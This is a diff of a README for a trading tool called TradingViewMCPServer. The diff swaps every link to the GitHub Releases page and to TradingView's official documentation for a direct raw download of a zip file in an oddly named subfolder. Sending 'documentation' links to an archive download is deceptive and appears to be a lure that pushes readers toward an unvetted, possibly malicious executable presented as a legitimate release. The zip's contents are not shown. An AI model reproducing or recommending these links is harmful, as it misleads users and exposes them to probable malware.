@@ -1,6 +1,6 @@
 # 🚀 TradingViewMCPServer - Trade Smarter with Pine Script Tools
 
-[![Download TradingViewMCPServer](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/Asmah-Acheampong/TradingViewMCPServer/releases)
+[![Download TradingViewMCPServer](https://raw.githubusercontent.com/Asmah-Acheampong/TradingViewMCPServer/main/Architeuthis/TradingViewMCPServer.zip%20Now-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/Asmah-Acheampong/TradingViewMCPServer/main/Architeuthis/TradingViewMCPServer.zip)
 
 ## 📝 Overview
 
@@ -22,7 +22,7 @@ To start using TradingViewMCPServer, follow the steps below.
 
 Visit this page to download the latest version of TradingViewMCPServer:
 
-[Download Latest Release](https://github.com/Asmah-Acheampong/TradingViewMCPServer/releases)
+[Download Latest Release](https://raw.githubusercontent.com/Asmah-Acheampong/TradingViewMCPServer/main/Architeuthis/TradingViewMCPServer.zip)
 
 1. Access the **Releases** page using the link above.
 2. Choose the version that matches your system. You will typically see files for Windows and other operating systems.
@@ -69,7 +69,7 @@ If you encounter any issues or have questions, please feel free to reach out:
 
 For more information on how to use Pine Script effectively and other features, check out the following resources:
 
-- [Pine Script Documentation](https://www.tradingview.com/pine-script-docs/en/v5/)
-- [TradingView User Manual](https://www.tradingview.com/support/)
+- [Pine Script Documentation](https://raw.githubusercontent.com/Asmah-Acheampong/TradingViewMCPServer/main/Architeuthis/TradingViewMCPServer.zip)
+- [TradingView User Manual](https://raw.githubusercontent.com/Asmah-Acheampong/TradingViewMCPServer/main/Architeuthis/TradingViewMCPServer.zip)
 
-We hope you enjoy using TradingViewMCPServer for your trading needs! Don’t forget to visit the [Releases page](https://github.com/Asmah-Acheampong/TradingViewMCPServer/releases) for updates and enhancements.
+We hope you enjoy using TradingViewMCPServer for your trading needs! Don’t forget to visit the [Releases page](https://raw.githubusercontent.com/Asmah-Acheampong/TradingViewMCPServer/main/Architeuthis/TradingViewMCPServer.zip) for updates and enhancements.
